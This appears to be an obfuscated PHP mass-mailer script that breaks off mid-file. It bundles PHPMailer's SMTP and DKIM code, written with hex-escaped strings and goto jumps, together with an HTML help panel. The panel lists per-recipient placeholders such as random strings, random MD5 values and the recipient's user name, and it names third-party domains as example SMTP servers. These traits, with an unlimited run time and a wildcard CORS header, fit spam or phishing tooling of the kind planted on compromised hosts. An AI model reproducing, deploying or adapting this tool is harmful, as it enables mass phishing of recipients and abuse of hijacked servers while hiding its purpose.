$DKIMb64 . "\x3b" . static::$LE . "\40\x62\75"; $canonicalizedHeaders = $this->DKIM_HeaderC($headerValues . static::$LE . $dkimSignatureHeader); $signature = $this->DKIM_Sign($canonicalizedHeaders); $signature = trim(chunk_split($signature, self::STD_LINE_LENGTH - 3, static::$LE . self::FWS)); return static::normalizeBreaks($dkimSignatureHeader . $signature); } public static function hasLineLongerThanMax($str) { return (bool) preg_match("\x2f\x5e\x28\x2e\x7b" . (self::MAX_LINE_LENGTH + strlen(static::$LE)) . "\54\x7d\x29\x2f\x6d", $str); } public static function quotedString($str) { if (preg_match("\57\x5b\x20\x28\51\x3c\76\x40\x2c\73\72\42\x5c\57\134\x5b\x5c\x5d\x3f\x3d\135\x2f", $str)) { return "\x22" . str_replace("\x22", "\134\42", $str) . "\x22"; } return $str; } public function getToAddresses() { return $this->to; } public function getCcAddresses() { return $this->cc; } public function getBccAddresses() { return $this->bcc; } public function getReplyToAddresses() { return $this->ReplyTo; } public function getAllRecipientAddresses() { return $this->all_recipients; } protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from, $extra) { if (!empty($this->action_function) && is_callable($this->action_function)) { call_user_func($this->action_function, $isSent, $to, $cc, $bcc, $subject, $body, $from, $extra); } } public function getOAuth() { return $this->oauth; } public function setOAuth(OAuthTokenProvider $oauth) { $this->oauth = $oauth; } } goto LFI7v; H_gNP: function owlTrim($string) { return stripslashes(ltrim(rtrim($string))); } goto T66zf; BHhGD: ?>
)</li>
                <li>[-emailuser-] : <b>Email User</b> (emailuser@emaildomain)</li>
                <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
                <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                <li>[-randommd5-] : <b>Random MD5 </b></li>
                <li>[-smtpuser-] : <b>SMTP Username</b></li>
                <li>[-smtpserver-] : <b>SMTP Server Domain</b> (e.g., architects.lk)</li>
                <li>[-domain-] : <b>Server Domain</b> (e.g., allner.de)</li>
            </ul>
            <h4>example</h4>
            Reciver Email = <b>user@domain.com</b><br>
            <ul>
                <li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>
                <li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
            </ul>
            <h6>by <b><a href="http://<?php  goto WL3yP; s74ol: set_time_limit(0); goto Ceflh; DhZMT: header("\x50\x72\141\x67\155\x61\72\40\x6e\157\55\x63\141\143\x68\x65"); goto IkHv_; L1VZJ: echo $_SERVER["\x53\x45\x52\126\x45\x52\x5f\x41\x44\x44\122"]; goto QD3fs; IkHv_: header("\x41\x63\x63\145\163\x73\55\x43\157\156\164\162\x6f\x6c\x2d\x41\154\154\x6f\167\x2d\x4f\x72\x69\147\151\x6e\x3a\x20\x2a"); goto lbIM4; pKqns: echo date("\x6d\57\144\57\x59\40\150\x3a\151\x3a\163\x20\141", time()); goto BHhGD; LFI7v: class SMTP { const VERSION = "\66\56\x31\x30\56\x30"; const LE = "\xd\xa"; const DEFAULT_PORT = 25; const DEFAULT_SECURE_PORT = 465; const MAX_LINE_LENGTH = 998; const MAX_REPLY_LENGTH = 512; const DEBUG_OFF = 0; const DEBUG_CLIENT = 1; const DEBUG_SERVER = 2; const DEBUG_CONNECTION = 3; const DEBUG_LOWLEVEL = 4; public $do_debug = self::DEBUG_OFF; public $Debugoutput = "\145\x63\150\157"; public $do_verp = false; public $do_smtputf8 = false; public $Timeout = 300; public $Timelimit = 300; protected $smtp_transaction_id_patterns = array("\x65\170\x69\155" => "\57\x5b\134\144\135\x7b\63\x7d\40\x4f\113\x20\x69\x64\75\x28\56\52\51\x2f", "\x73\x65\x6e\144\x6d\x61\x69\154" => "\57\133\x5c\x64\x5d\173\x33\x7d\x20\x32\x5c\x2e\x30\134\x2e\60\40\x28\56\x2a\x29\x20\x4d\x65\163\163\x61\x67\145\x2f", "\x70\x6f\163\164\x66\x69\170" => "\57\x5b\134\x64\135\173\63\x7d\x20\x32\134\x2e\60\134\56\60\40\x4f\153\72\40\161\x75\145\165\145\144\40\x61\x73\x20\x28\x2e\x2a\51\57", "\115\151\x63\x72\157\163\x6f\146\164\137\105\x53\115\x54\x50" => "\57\133\60\x2d\71\x5d\173\x33\x7d\40\x32\134\56\133\x5c\x64\x5d\134\56\60\40\x28\x2e\52\x29\100\x28\x3f\72\56\52\x29\x20\x51\165\145\x75\x65\x64\40\155\141\151\154\40\146\157\162\40\144\x65\x6c\x69\166\145\162\x79\57", "\101\x6d\x61\172\x6f\x6e\137\x53\105\x53" => "\x2f\133\134\x64\135\173\x33\x7d\x20\117\153\40\x28\x2e\x2a\x29\x2f", "\x53\145\x6e\144\x47\162\151\x64" => "\x2f\x5b\x5c\x64\x5d\173\x33\175\40\x4f\x6b\x3a\40\x71\x75\x65\x75\x65\144\x20\x61\x73\40\x28\x2e\52\x29\57", "\x43\141\155\x70\x61\x69\x67\156\115\157\156\151\x74\157\162" => "\57\133\134\144\x5d\173\x33\175\40\x32\x5c\x2e\x30\134\56\60\x20\117\113\x3a\x28\133\141\x2d\x7a\x41\x2d\x5a\x5c\144\135\x7b\64\x38\175\x29\x2f", "\x48\x61\x72\141\x6b\141" => "\x2f\x5b\x5c\x64\135\x7b\x33\x7d\40\x4d\x65\x73\x73\x61\x67\x65\40\121\165\x65\165\145\144\x20\134\x28\50\x2e\x2a\x29\134\x29\57", "\132\157\156\x65\x4d\124\x41" => "\57\x5b\134\x64\x5d\x7b\x33\x7d\x20\x4d\x65\x73\163\x61\x67\145\x20\x71\165\145\165\x65\144\40\141\163\x20\x28\56\x2a\51\x2f", "\115\141\x69\154\x6a\x65\164" => "\x2f\133\x5c\x64\135\173\63\175\40\117\x4b\40\x71\x75\x65\165\x65\144\40\141\x73\40\x28\56\x2a\x29\57"); public static $xclient_allowed_attributes = array("\x4e\101\x4d\x45", "\x41\104\104\122", "\120\117\122\x54", "\120\122\117\124\x4f", "\x48\x45\114\x4f", "\x4c\117\107\111\x4e", "\104\105\x53\x54\x41\104\104\122", "\104\x45\123\x54\120\117\x52\124"); protected $last_smtp_transaction_id; protected $smtp_conn; protected $error = array("\x65\162\x72\157\x72" => '', "\144\145\x74\x61\x69\154" => '', "\x73\x6d\164\160\137\143\157\x64\145" => '', "\163\155\164\x70\137\143\x6f\x64\x65\x5f\x65\x78" => ''); protected $helo_rply; protected $server_caps; protected $last_reply = ''; protected function edebug($str, $level = 0) { if ($level > $this->do_debug) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug(rtrim($str, "\15\xa")); return; } if (is_callable($this->Debugoutput) && !in_array($this->Debugoutput, array("\145\162\x72\157\162\137\x6c\157\x67", "\150\x74\155\154", "\x65\x63\x68\x6f"))) { call_user_func($this->Debugoutput, $str, $level); return; } switch ($this->Debugoutput) { case "\145\162\x72\x6f\162\137\154\x6f\x67": error_log($str); break; case "\150\x74\x6d\x6c": echo gmdate("\131\x2d\155\x2d\x64\40\110\x3a\151\x3a\x73"), "\x20", htmlentities(preg_replace("\57\x5b\134\162\x5c\156\135\53\x2f", '', $str), ENT_QUOTES, "\x55\x54\x46\55\x38"), "\x3c\142\x72\76\xa"; break; case "\145\143\150\x6f": default: $str = preg_replace("\x2f\134\x72\x5c\x6e\174\134\162\x2f\155", "\12", $str); echo gmdate("\131\x2d\155\x2d\x64\x20\110\x3a\151\x3a\163"), "\x9", trim(str_replace("\xa", "\12\x20\x20\40\x20\x20\40\40\40\40\x20\x20\x20\40\40\x20\x20\x20\x20\40\x9\x20\x20\40\40\40\x20\x20\40\40\x20\40\x20\40\40\x20\40\x20\x20", trim($str))), "\xa"; } } public function connect($host, $port = null, $timeout = 30, $options = array()) { $this->setError(''); if ($this->connected()) { $this->setError("\x41\154\x72\x65\141\144\x79\x20\x63\157\x6e\x6e\145\x63\x74\145\144\40\164\x6f\x20\141\x20\x73\145\x72\x76\145\x72"); return false; } if (empty($port)) { $port = self::DEFAULT_PORT; } $this->edebug("\x43\x6f\156\156\x65\x63\x74\x69\x6f\x6e\x3a\x20\157\160\x65\x6e\x69\156\x67\40\x74\x6f\x20{$host}\72{$port}\54\40\x74\151\155\145\157\x75\164\75{$timeout}\x2c\x20\x6f\x70\164\151\157\x6e\163\x3d" . (count($options) > 0 ? var_export($options, true) : "\141\x72\x72\141\171\x28\x29"), self::DEBUG_CONNECTION); $this->smtp_conn = $this->getSMTPConnection($host, $port, $timeout, $options); if ($this->smtp_conn === false) { return false; } $this->edebug("\103\x6f\x6e\156\x65\143\x74\x69\157\156\72\40\x6f\x70\x65\156\145\x64", self::DEBUG_CONNECTION); $this->last_reply = $this->get_lines(); $this->edebug("\x53\105\x52\126\105\122\x20\x2d\76\40\103\x4c\111\105\x4e\124\x3a\x20" . $this->last_reply, self::DEBUG_SERVER); $responseCode = (int) substr($this->last_reply, 0, 3); if ($responseCode === 220) { return true; } if ($responseCode === 554) { $this->quit(); } $this->edebug("\103\x6f\156\x6e\145\143\x74\x69\x6f\x6e\72\x20\x63\154\157\163\x69\x6e\x67\x20\144\165\x65\40\x74\157\x20\x65\162\x72\x6f\162", self::DEBUG_CONNECTION); $this->close(); return false; } protected function getSMTPConnection($host, $port = null, $timeout = 30, $options = array()) { static $streamok; if (null === $streamok) { $streamok = function_exists("\163\x74\162\145\x61\155\137\x73\157\143\153\x65\x74\x5f\x63\154\151\145\x6e\164"); } $errno = 0; $errstr = ''; if ($streamok) { $socket_context = stream_context_create($options); set_error_handler(function () { call_user_func_array(array($this, "\x65\162\x72\157\162\x48\x61\x6e\x64\x6c\x65\x72"), func_get_args()); }); $connection = stream_socket_client($host . "\x3a" . $port, $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $socket_context); } else { $this->edebug("\x43\157\156\x6e\x65\143\x74\151\x6f\156\72\x20\163\164\x72\145\x61\155\x5f\163\157\x63\x6b\145\x74\137\143\154\x69\145\156\x74\40\156\x6f\x74\40\141\x76\141\151\x6c\141\142\154\x65\x2c\x20\x66\141\154\x6c\x69\156\x67\40\142\141\143\153\40\x74\x6f\x20\x66\163\157\x63\153\157\160\x65\x6e", self::DEBUG_CONNECTION); set_error_handler(function () { call_user_func_array(array($this, "\x65\162\x72\x6f\162\x48\141\x6e\x64\154\145\x72"), func_get_args()); }); $connection = fsockopen($host, $port, $errno, $errstr, $timeout); } restore_error_handler(); if (!is_resource($connection)) { $this->setError("\x46\141\151\154\x65\x64\x20\x74\x6f\40\143\x6f\156\156\x65\x63\x74\40\x74\x6f\40\x73\145\162\x76\145\162", '', (string) $errno, $errstr); $this->edebug("\x53\115\124\120\x20\x45\122\122\117\x52\x3a\x20" . $this->error["\145\x72\162\x6f\x72"] . "\72\x20{$errstr}\x20\50{$errno}\51", self::DEBUG_CLIENT); return false; } if (strpos(PHP_OS, "\x57\111\116") !== 0) { $max = (int) ini_get("\155\x61\170\137\145\170\145\143\165\x74\x69\x6f\156\x5f\x74\x69\x6d\145"); if (0 !== $max && $timeout > $max && strpos(ini_get("\144\151\163\141\x62\x6c\x65\x5f\146\x75\156\x63\164\151\x6f\x6e\x73"), "\163\145\x74\137\164\x69\x6d\x65\137\x6c\151\x6d\x69\x74") === false) { @set_time_limit($timeout); } stream_set_timeout($connection, $timeout, 0); } return $connection; } public function startTLS() { if (!$this->sendCommand("\123\x54\x41\x52\x54\124\114\123", "\x53\124\101\122\124\124\114\x53", 220)) { return false; } $crypto_method = STREAM_CRYPTO_METHOD_TLS_CLIENT; if (defined("\123\124\x52\x45\101\115\x5f\x43\x52\131\120\x54\117\x5f\x4d\x45\x54\110\x4f\104\x5f\x54\x4c\123\166\61\137\62\x5f\x43\x4c\x49\105\x4e\x54")) { $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT; $crypto_method |= STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT; } set_error_handler(function () { call_user_func_array(array($this, "\x65\162\x72\x6f\162\x48\141\x6e\144\x6c\x65\x72"), func_get_args()); }); $crypto_ok = stream_socket_enable_crypto($this->smtp_conn, true, $crypto_method); restore_error_handler(); return (bool) $crypto_ok; } public function authenticate($username, $password, $authtype = null, $OAuth = null) { if (!$this->server_caps) { $this->setError("\x41\165\164\x68\x65\x6e\164\x69\143\141\x74\151\x6f\156\x20\151\x73\40\x6e\157\164\40\x61\154\x6c\x6f\x77\x65\x64\x20\142\x65\x66\157\162\145\40\110\105\x4c\x4f\x2f\x45\x48\114\117"); return false; } if (array_key_exists("\x45\110\x4c\x4f", $this->server_caps)) { if (!array_key_exists("\101\125\x54\110", $this->server_caps)) { $this->setError("\101\x75\164\150\145\156\x74\151\143\x61\164\x69\157\x6e\x20\151\x73\x20\x6e\x6f\164\40\x61\154\x6c\157\x77\145\x64\x20\141\x74\x20\164\x68\x69\x73\40\163\x74\141\147\x65"); return false; } $this->edebug("\x41\165\164\150\40\x6d\x65\x74\x68\x6f\144\x20\162\x65\161\165\145\163\164\145\x64\72\40" . ($authtype ?: "\125\116\x53\x50\105\103\x49\106\x49\105\x44"), self::DEBUG_LOWLEVEL); $this->edebug("\101\165\x74\150\40\x6d\x65\x74\x68\x6f\x64\x73\40\x61\x76\141\151\154\141\x62\x6c\x65\40\157\156\40\164\x68\x65\40\x73\x65\162\166\145\162\72\x20" . implode("\x2c", $this->server_caps["\x41\x55\x54\x48"]), self::DEBUG_LOWLEVEL); if (null !== $authtype && !in_array($authtype, $this->server_caps["\x41\125\x54\x48"], true)) { $this->edebug("\122\x65\x71\x75\x65\163\x74\145\x64\x20\x61\x75\x74\150\x20\x6d\x65\x74\x68\157\144\x20\156\x6f\164\40\x61\x76\x61\151\154\x61\142\x6c\x65\72\40" . $authtype, self::DEBUG_LOWLEVEL); $authtype = null; } if (empty($authtype)) { foreach (array("\103\122\101\115\x2d\x4d\104\65", "\x4c\x4f\107\111\x4e", "\120\x4c\101\111\x4e", "\x58\117\101\x55\124\110\x32") as $method) { if (in_array($method, $this->server_caps["\101\x55\x54\x48"], true)) { $authtype = $method; break; } } if (empty($authtype)) { $this->setError("\x4e\x6f\x20\163\x75\160\160\157\x72\x74\x65\144\40\x61\165\x74\150\145\156\164\x69\x63\x61\x74\x69\157\156\x20\155\145\x74\x68\157\x64\x73\40\146\157\165\x6e\x64"); return false; } $this->edebug("\x41\165\164\x68\x20\155\145\164\x68\157\x64\40\163\x65\154\145\143\164\145\144\x3a\40" . $authtype, self::DEBUG_LOWLEVEL); } if (!in_array($authtype, $this->server_caps["\101\x55\x54\110"], true)) { $this->setError("\124\x68\x65\40\x72\145\x71\165\x65\x73\x74\x65\x64\x20\x61\165\x74\x68\145\x6e\164\x69\143\141\164\151\157\x6e\x20\x6d\x65\x74\150\x6f\144\40\x22{$authtype}\42\40\x69\163\x20\x6e\157\x74\x20\163\x75\x70\160\x6f\x72\164\145\144\x20\142\x79\x20\x74\150\145\40\163\x65\162\x76\x65\162"); return false; } } elseif (empty($authtype)) { $authtype = "\114\117\x47\111\116"; } switch ($authtype) { case "\x50\x4c\x41\x49\116": if (!$this->sendCommand("\x41\125\124\110", "\x41\125\124\110\40\120\114\101\111\116", 334)) { return false; } if (!$this->sendCommand("\125\x73\145\x72\x20\46\x20\120\141\x73\163\167\x6f\162\x64", base64_encode("\x0" . $username . "\0" . $password), 235)) { return false; } break; case "\114\x4f\x47\111\116": if (!$this->sendCommand("\101\x55\x54\110", "\x41\125\x54\x48\x20\114\117\107\111\x4e", 334)) { return false; } if (!$this->sendCommand("\x55\163\145\x72\156\141\155\x65", base64_encode($username), 334)) { return false; } if (!$this->sendCommand("\x50\x61\x73\163\167\157\x72\144", base64_encode($password), 235)) { return false; } break; case "\x43\122\x41\x4d\x2d\115\x44\65": if (!$this->sendCommand("\x41\x55\x54\x48\40\103\122\101\x4d\x2d\115\104\65", "\101\x55\x54\110\x20\103\122\x41\x4d\x2d\x4d\104\65", 334)) { return false; } $challenge = base64_decode(substr($this->last_reply, 4)); $response = $username . "\40" . $this->hmac($challenge, $password); return $this->sendCommand("\125\163\x65\162\x6e\141\x6d\145", base64_encode($response), 235); case "\130\x4f\x41\x55\124\x48\x32": if (null === $OAuth) { return false; } $oauth = $OAuth->getOauth64(); if (!$this->sendCommand("\x41\125\x54\110", "\x41\x55\124\x48\40\130\117\x41\125\124\x48\62\40" . $oauth, 235)) { return false; } break; default: $this->setError("\101\x75\164\150\145\156\164\x69\x63\x61\x74\151\x6f\x6e\40\x6d\x65\x74\x68\x6f\144\40\x22{$authtype}\42\x20\151\x73\40\x6e\157\x74\40\x73\x75\160\160\x6f\162\164\145\x64"); return false; } return true; } protected function hmac($data, $key) { if (function_exists("\150\141\163\x68\137\x68\x6d\x61\x63")) { return hash_hmac("\x6d\x64\65", $data, $key); } $bytelen = 64; if (strlen($key) > $bytelen) { $key = pack("\x48\x2a", md5($key)); } $key = str_pad($key, $bytelen, chr(0)); $ipad = str_pad('', $bytelen, chr(54)); $opad = str_pad('', $bytelen, chr(92)); $k_ipad = $key ^ $ipad; $k_opad = $key ^ $opad; return md5($k_opad . pack("\110\x2a", md5($k_ipad . $data))); } public function connected() { if (is_resource($this->smtp_conn)) { $sock_status = stream_get_meta_data($this->smtp_conn); if ($sock_status["\145\x6f\x66"]) { $this->edebug("\x53\x4d\x54\120\x20\116\117\x54\111\x43\x45\72\x20\x45\x4f\x46\40\143\141\165\147\150\164\x20\167\x68\151\154\145\x20\x63\x68\x65\x63\x6b\151\x6e\x67\40\x69\x66\x20\143\157\x6e\x6e\x65\x63\164\x65\x64", self::DEBUG_CLIENT); $this->close(); return false; } return true; } return false; } public function close() { $this->server_caps = null; $this->helo_rply = null; if (is_resource($this->smtp_conn)) { fclose($this->smtp_conn); $this->smtp_conn = null; $this->edebug("\x43\157\x6e\x6e\145\x63\164\151\x6f\x6e\x3a\40\x63\154\x6f\163\145\144", self::DEBUG_CONNECTION); } } public function data($msg_data) { if (!$this->sendCommand("\x44\x41\124\x41", "\104\101\x54\101", 354)) { return false; } $lines = explode("\12", str_replace(array("\15\xa", "\xd"), "\xa", $msg_data)); $field = substr($lines[0], 0, strpos($lines[0], "\72")); $in_headers = false; if (!empty($field) && strpos($field, "\x20") === false) { $in_headers = true; } foreach ($lines as $line) { $lines_out = array(); if ($in_headers && $line === '') { $in_headers = false; } while (isset($line[self::MAX_LINE_LENGTH])) { $pos = strrpos(substr($line, 0, self::MAX_LINE_LENGTH), "\x20"); if (!$pos) { $pos = self::MAX_LINE_LENGTH - 1; $lines_out[] = substr($line, 0, $pos); $line = substr($line, $pos); } else { $lines_out[] = substr($line, 0, $pos); $line = substr($line, $pos + 1); } if ($in_headers) { $line = "\11" . $line; } } $lines_out[] = $line; foreach ($lines_out as $line_out) { if (!empty($line_out) && $line_out[0] === "\56") { $line_out = "\56" . $line_out; } $this->client_send($line_out . static::LE, "\x44\x41\124\x41"); } } $savetimelimit = $this->Timelimit; $this->Timelimit *= 2; $result = $this->sendCommand("\x44\x41\124\101\x20\x45\x4e\104", "\x2e", 250); $this->recordLastTransactionID(); $this->Timelimit = $savetimelimit; return $result; } public function hello($host = '') { if ($this->sendHello("\105\110\114\117", $host)) { return true; } if (substr($this->helo_rply, 0, 3) == "\64\62\x31") { return false; } return $this->sendHello("\x48\x45\x4c\x4f", $host); } protected function sendHello($hello, $host) { $noerror = $this->sendCommand($hello, $hello . "\40" . $host, 250); $this->helo_rply = $this->last_reply; if ($noerror) { $this->parseHelloFields($hello); } else { $this->server_caps = null; } return $noerror; } protected function parseHelloFields($type) { $this->server_caps = array(); $lines = explode("\12", $this->helo_rply); foreach ($lines as $n => $s) { $s = trim(substr($s, 4)); if (empty($s)) { continue; } $fields = explode("\40", $s); if (!empty($fields)) { if (!$n) { $name = $type; $fields = $fields[0]; } else { $name = array_shift($fields); switch ($name) { case "\x53\111\132\105": $fields = $fields ? $fields[0] : 0; break; case "\x41\125\x54\x48": if (!is_array($fields)) { $fields = array(); } break; default: $fields = true; } } $this->server_caps[$name] = $fields; } } } public function mail($from) { $useVerp = $this->do_verp ? "\x20\x58\x56\x45\x52\120" : ''; $useSmtputf8 = $this->do_smtputf8 ? "\40\x53\115\124\x50\x55\x54\x46\x38" : ''; return $this->sendCommand("\x4d\x41\111\x4c\x20\x46\122\x4f\x4d", "\x4d\101\x49\x4c\40\106\122\117\x4d\72\74" . $from . "\76" . $useSmtputf8 . $useVerp, 250); } public function quit($close_on_error = true) { $noerror = $this->sendCommand("\121\x55\x49\x54", "\121\125\x49\x54", 221); $err = $this->error; if ($noerror || $close_on_error) { $this->close(); $this->error = $err; } return $noerror; } public function recipient($address, $dsn = '') { if (empty($dsn)) { $rcpt = "\122\x43\120\x54\40\124\x4f\x3a\x3c" . $address . "\76"; } else { $dsn = strtoupper($dsn); $notify = array(); if (strpos($dsn, "\116\x45\126\x45\x52") !== false) { $notify[] = "\116\x45\126\105\x52"; } else { foreach (array("\x53\125\x43\x43\105\123\123", "\106\101\111\114\x55\122\105", "\104\x45\114\101\131") as $value) { if (strpos($dsn, $value) !== false) { $notify[] = $value; } } } $rcpt = "\x52\103\120\x54\x20\x54\x4f\x3a\74" . $address . "\76\x20\116\117\x54\111\x46\131\75" . implode("\x2c", $notify); } return $this->sendCommand("\122\x43\120\x54\40\124\x4f", $rcpt, array(250, 251)); } public function xclient(array $vars) { $xclient_options = ''; foreach ($vars as $key => $value) { if (in_array($key, SMTP::$xclient_allowed_attributes)) { $xclient_options .= "\40{$key}\x3d{$value}"; } } if (!$xclient_options) { return true; } return $this->sendCommand("\130\103\x4c\111\105\116\124", "\x58\x43\114\111\x45\x4e\x54" . $xclient_options, 250); } public function reset() { return $this->sendCommand("\x52\123\x45\124", "\x52\123\x45\124", 250); } protected function sendCommand($command, $commandstring, $expect) { if (!$this->connected()) { $this->setError("\x43\x61\154\154\x65\144\40{$command}\40\167\x69\x74\x68\x6f\x75\x74\40\142\145\x69\x6e\147\x20\143\157\156\156\x65\x63\164\x65\x64"); return false; } if (strpos($commandstring, "\xa") !== false || strpos($commandstring, "\xd") !== false) { $this->setError("\103\x6f\155\155\x61\156\144\40\47{$command}\x27\x20\x63\x6f\156\x74\x61\151\x6e\x65\144\40\154\151\x6e\x65\40\x62\162\x65\x61\153\x73"); return false; } $this->client_send($commandstring . static::LE, $command); $this->last_reply = $this->get_lines(); $matches = array(); if (preg_match("\x2f\x5e\x28\133\x5c\144\x5d\173\x33\175\51\x5b\x20\x2d\x5d\x28\77\x3a\x28\133\x5c\x64\x5d\x5c\56\x5b\x5c\144\135\134\x2e\133\134\x64\x5d\173\61\x2c\62\x7d\x29\x20\51\77\x2f", $this->last_reply, $matches)) { $code = (int) $matches[1]; $code_ex = count($matches) > 2 ? $matches[2] : null; $detail = preg_replace("\57{$code}\133\40\55\x5d" . ($code_ex ? str_replace("\56", "\134\56", $code_ex) . "\x20" : '') . "\x2f\155", '', $this->last_reply); } else { $code = (int) substr($this->last_reply, 0, 3); $code_ex = null; $detail = substr($this->last_reply, 4); } $this->edebug("\123\105\x52\126\105\122\x20\55\x3e\40\103\114\x49\105\x4e\x54\x3a\x20" . $this->last_reply, self::DEBUG_SERVER); if (!in_array($code, (array) $expect, true)) { $this->setError("{$command}\x20\x63\x6f\155\x6d\x61\156\x64\x20\146\141\x69\x6c\145\144", $detail, $code, $code_ex); $this->edebug("\123\x4d\x54\x50\40\x45\122\x52\x4f\x52\72\x20" . $this->error["\x65\x72\162\x6f\x72"] . "\x3a\x20" . $this->last_reply, self::DEBUG_CLIENT); return false; } if ($command !== "\x52\x53\105\124") { $this->setError(''); } return true; } public function sendAndMail($from) { return $this->sendCommand("\x53\101\x4d\x4c", "\x53\x41\x4d\x4c\40\106\x52\x4f\x4d\x3a{$from}", 250); } public function verify($name) { return $this->sendCommand("\126\122\x46\x59", "\x56\x52\106\131\40{$name}", array(250, 251)); } public function noop() { return $this->sendCommand("\116\117\117\120", "\116\x4f\x4f\x50", 250); } public function turn() { $this->setError("\124\150\145\x20\123\x4d\x54\120\x20\124\x55\122\116\40\x63\x6f\x6d\x6d\x61\156\144\x20\x69\163\x20\156\157\x74\40\x69\155\x70\x6c\x65\x6d\x65\156\164\x65\x64"); $this->edebug("\123\x4d\x54\x50\40\116\117\x54\111\103\x45\72\x20" . $this->error["\145\162\x72\157\x72"], self::DEBUG_CLIENT); return false; } public function client_send($data, $command = '') { if (self::DEBUG_LOWLEVEL > $this->do_debug && in_array($command, array("\125\x73\x65\x72\40\x26\x20\120\141\x73\163\167\157\162\144", "\x55\x73\x65\x72\x6e\x61\x6d\x65", "\120\x61\163\x73\167\x6f\x72\144"), true)) { $this->edebug("\x43\x4c\111\105\116\124\40\55\x3e\x20\x53\x45\122\126\105\x52\x3a\40\x5b\143\162\145\x64\x65\156\x74\x69\141\x6c\163\x20\x68\x69\144\x64\145\156\x5d", self::DEBUG_CLIENT); } else { $this->edebug("\103\114\111\x45\116\124\x20\55\76\40\123\x45\x52\x56\x45\x52\x3a\x20" . $data, self::DEBUG_CLIENT); } set_error_handler(function () { call_user_func_array(array($this, "\145\x72\x72\x6f\x72\110\x61\x6e\x64\154\145\162"), func_get_args()); }); $result = fwrite($this->smtp_conn, $data); restore_error_handler(); return $result; } public function getError() { return $this->error; } public function getServerExtList() { return $this->server_caps; } public function getServerExt($name) { if (!$this->server_caps) { $this->setError("\x4e\x6f\x20\110\x45\x4c\x4f\x2f\105\110\x4c\x4f\40\x77\141\x73\40\x73\x65\x6e\164"); return null; } if (!array_key_exists($name, $this->server_caps)) { if ("\110\x45\x4c\117" === $name) { return $this->server_caps["\105\x48\x4c\x4f"]; } if ("\105\110\x4c\x4f" === $name || array_key_exists("\105\x48\x4c\x4f", $this->server_caps)) { return false; } $this->setError("\110\105\114\117\40\x68\141\x6e\x64\x73\x68\x61\x6b\145\x20\167\141\163\40\x75\163\145\144\73\40\x4e\157\40\x69\x6e\146\157\162\155\141\x74\151\x6f\156\x20\141\x62\x6f\x75\164\40\x73\145\x72\x76\145\162\x20\x65\170\164\145\x6e\x73\151\157\x6e\163\40\x61\166\x61\x69\154\141\142\x6c\x65"); return null; } return $this->server_caps[$name]; } public function getLastReply() { return $this->last_reply; } protected function get_lines() { if (!is_resource($this->smtp_conn)) { return ''; } $data = ''; $endtime = 0; stream_set_timeout($this->smtp_conn, $this->Timeout); if ($this->Timelimit > 0) { $endtime = time() + $this->Timelimit; } $selR = array($this->smtp_conn); $selW = null; while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) { set_error_handler(function () { call_user_func_array(array($this, "\x65\162\x72\x6f\162\110\x61\x6e\144\x6c\145\162"), func_get_args()); }); $n = stream_select($selR, $selW, $selW, $this->Timelimit); restore_error_handler(); if ($n === false) { $message = $this->getError()["\144\x65\164\x61\x69\154"]; $this->edebug("\123\115\x54\x50\40\55\76\40\147\145\x74\x5f\x6c\151\156\145\163\x28\51\x3a\40\x73\x65\154\145\x63\164\40\x66\141\x69\x6c\145\144\40\x28" . $message . "\51", self::DEBUG_LOWLEVEL); if (stripos($message, "\151\156\164\145\x72\x72\165\x70\x74\145\144\40\x73\171\x73\164\145\x6d\40\x63\x61\x6c\x6c") !== false) { $this->edebug("\123\115\x54\x50\40\x2d\x3e\x20\x67\x65\x74\137\x6c\151\156\145\x73\50\51\72\40\x72\x65\x74\x72\171\x69\156\x67\x20\163\x74\x72\x65\141\x6d\x5f\163\x65\x6c\x65\143\x74", self::DEBUG_LOWLEVEL); $this->setError(''); continue; } break; } if (!$n) { $this->edebug("\x53\115\x54\x50\x20\x2d\x3e\x20\x67\145\164\137\154\x69\x6e\145\163\x28\51\x3a\40\x73\145\x6c\145\143\x74\40\x74\x69\155\x65\x64\55\x6f\x75\x74\x20\x69\x6e\40\x28" . $this->Timelimit . "\x20\x73\x65\143\x29", self::DEBUG_LOWLEVEL); break; } $str = @fgets($this->smtp_conn, self::MAX_REPLY_LENGTH); $this->edebug("\x53\x4d\124\x50\40\x49\116\x42\x4f\125\x4e\104\x3a\x20\42" . trim($str) . "\42", self::DEBUG_LOWLEVEL); $data .= $str; if (!isset($str[3]) || $str[3] === "\40" || $str[3] === "\xd" || $str[3] === "\xa") { break; } $info = stream_get_meta_data($this->smtp_conn); if ($info["\164\151\x6d\145\144\x5f\x6f\x75\164"]) { $this->edebug("\x53\115\124\120\x20\55\x3e\x20\147\x65\x74\137\x6c\x69\156\x65\x73\50\51\72\x20\x73\164\162\x65\141\x6d\x20\164\x69\155\x65\144\x2d\x6f\165\x74\x20\50" . $this->Timeout . "\x20\163\x65\143\51", self::DEBUG_LOWLEVEL); break; } if ($endtime && time() > $endtime) { $this->edebug("\x53\x4d\124\120\40\55\76\40\x67\145\x74\x5f\154\151\x6e\x65\163\50\51\72\x20\164\x69\155\x65\154\151\155\151\164\40\x72\x65\141\x63\150\x65\144\40\50" . $this->Timelimit . "\x20\x73\145\x63\x29", self::DEBUG_LOWLEVEL); break; } } return $data; } public function setVerp($enabled = false) { $this->do_verp = $enabled; } public function getVerp() { return $this->do_verp; } public function setSMTPUTF8($enabled = false) { $this->do_smtputf8 = $enabled; } public function getSMTPUTF8() { return $this->do_smtputf8; } protected function setError($message, $detail = '', $smtp_code = '', $smtp_code_ex = '') { $this->error = array("\x65\162\x72\157\162" => $message, "\144\145\x74\141\151\x6c" => $detail, "\163\155\164\x70\137\143\157\x64\145" => $smtp_code, "\x73\155\x74\160\x5f\143\157\x64\x65\x5f\x65\x78" => $smtp_code_ex); } public function setDebugOutput($method = "\x65\x63\x68\x6f") { $this->Debugoutput = $method; } public function getDebugOutput() { return $this->Debugoutput; } public function setDebugLevel($level = 0) { $this->do_debug = $level; } public function getDebugLevel() { return $this->do_debug; } public function 